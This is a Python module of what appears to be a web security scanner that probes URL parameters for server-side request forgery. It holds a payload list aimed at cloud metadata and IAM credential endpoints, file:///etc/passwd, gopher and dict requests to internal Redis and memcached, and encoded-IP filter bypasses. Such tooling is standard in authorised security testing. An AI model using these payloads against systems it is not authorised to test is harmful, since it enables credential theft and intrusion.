"""
modules/ssrf.py
---------------
Server-Side Request Forgery (SSRF) detection module.

Detects SSRF by injecting internal/loopback URLs into parameters
and analyzing responses for internal service indicators.
"""

import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any

from modules.base import BaseModule
from utils.helpers import extract_params, inject_param


DEFAULT_SSRF_PAYLOADS = [
    # Loopback / localhost
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://localhost/",
    "http://localhost:8080/",
    # IPv6 loopback
    "http://[::1]/",
    "http://[::]/",
    # Cloud metadata endpoints (AWS, GCP, Azure)
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/",
    "http://169.254.169.254/metadata/v1/",
    "http://168.63.129.16/",
    # Internal RFC-1918 ranges
    "http://10.0.0.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    # Protocol wrappers
    "file:///etc/passwd",
    "file:///c:/windows/win.ini",
    "dict://127.0.0.1:11211/stat",
    "gopher://127.0.0.1:6379/_INFO",
    "sftp://127.0.0.1:22/",
    # Encoded bypasses
    "http://0177.0.0.1/",        # octal
    "http://0x7f000001/",        # hex
    "http://2130706433/",        # decimal IP for 127.0.0.1
    "http://127.1/",
    "http://127.0.1/",
    # DNS rebinding hint
    "http://localtest.me/",
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/",
]

# Indicators that suggest a successful SSRF (internal content leaked)
SSRF_SUCCESS_INDICATORS = [
    # AWS metadata
    "ami-id", "instance-id", "instance-type", "local-ipv4",
    "security-credentials", "iam",
    # GCP metadata
    "computeMetadata", "serviceAccounts", "project-id",
    # Generic internal responses
    "root:x:0:0:",                # /etc/passwd via file://
    "[fonts]",                    # windows/win.ini via file://
    "redis_version",              # Redis INFO
    "mysql",                      # MySQL banner
    "ssh-",                       # SSH banner
    # Common internal web pages
    "apache", "nginx", "iis",
    "server status", "phpinfo",
    "welcome to", "index of /",
]

# Status codes that may hint at SSRF (reaching something internal)
SSRF_INTERESTING_STATUSES = [200, 301, 302, 401, 403]


class SSRFModule(BaseModule):
    """
    SSRF detection module.

    Injects internal/cloud-metadata URLs into parameters and looks for
    signs that the server made an outbound request to controlled targets.

    Detection strategy:
    1. Look for internal service indicators in the response body
    2. Flag unusual status codes (200/401/403) that differ from baseline
    3. Flag large response length deltas (server returned internal content)
    """

    def load_payloads(self) -> List[str]:
        """Load SSRF payloads from wordlist or defaults."""
        if self.config.wordlist:
            return self._load_external_wordlist(self.config.wordlist)
        return DEFAULT_SSRF_PAYLOADS

    def execute(self) -> List[Dict[str, Any]]:
        """Run SSRF scan against detected URL parameters."""
        payloads = self.load_payloads()
        self.logger.info(f"[+] {len(payloads)} SSRF payloads loaded")

        params = extract_params(self.config.url, self.config.param)
        if not params:
            self.logger.warning("[!] No injectable parameters detected in URL")
            return []

        self.logger.info(f"[+] Parameters: {', '.join(params)}")

        # Baseline response
        baseline = self._get_baseline()

        jobs = [(p, param) for param in params for p in payloads]
        self.logger.info(f"[*] Testing {len(jobs)} combinations...")

        results = []
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            futures = {
                executor.submit(self._test_payload, payload, param, baseline): (payload, param)
                for payload, param in jobs
            }
            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    if result.get("vulnerable"):
                        self.logger.info(
                            f"  [VULN] Param='{result['param']}'  "
                            f"Payload='{result['payload'][:50]}'"
                            f"  | {result['evidence']}"
                        )

        return results

    def _get_baseline(self) -> Dict:
        """Get a clean baseline response."""
        resp = self.http.get(self.config.url)
        if resp:
            return {"status": resp.status_code, "length": len(resp.content)}
        return {"status": 0, "length": 0}

    def _test_payload(self, payload: str, param: str, baseline: Dict) -> Dict[str, Any]:
        """Inject a SSRF payload and analyze the response. Delay applied per-worker."""
        if self.config.delay:
            time.sleep(self.config.delay)

        injected_url = inject_param(self.config.url, param, payload)
        response = self.http.get(injected_url, allow_redirects=False)

        if response is None:
            return {
                "payload": payload, "param": param,
                "vulnerable": False, "evidence": "No response", "url": injected_url,
            }

        return self.analyze_response(response, payload, param, baseline)

    def analyze_response(
        self, response, payload: str, param: str, baseline: Dict = None, **kwargs
    ) -> Dict[str, Any]:
        """Analyze response for SSRF evidence."""
        result = {
            "payload": payload, "param": param, "vulnerable": False,
            "evidence": "", "status_code": response.status_code,
            "response_length": len(response.content),
            "url": response.url if hasattr(response, "url") else self.config.url,
        }

        body = response.text.lower()

        # Check 1: Known internal content signatures
        for indicator in SSRF_SUCCESS_INDICATORS:
            if indicator.lower() in body:
                result["vulnerable"] = True
                result["evidence"] = f"Internal content indicator: '{indicator}'"
                return result

        # Check 2: Interesting status code + significant content
        if baseline:
            bl_status = baseline.get("status", 0)
            if (
                response.status_code in SSRF_INTERESTING_STATUSES
                and response.status_code != bl_status
                and len(response.content) > 100
            ):
                result["vulnerable"] = True
                result["evidence"] = (
                    f"Unexpected HTTP {response.status_code} "
                    f"(baseline was {bl_status}) — possible SSRF"
                )
                return result

        # Check 3: Large response delta (server fetched and returned internal data)
        if baseline:
            bl_len = baseline.get("length", 0)
            if bl_len > 0:
                delta = abs(len(response.content) - bl_len) / bl_len
                if delta > 0.5 and len(response.content) > 200:
                    result["vulnerable"] = True
                    result["evidence"] = (
                        f"Response length delta {delta:.0%} — possible SSRF data leak"
                    )

        return result
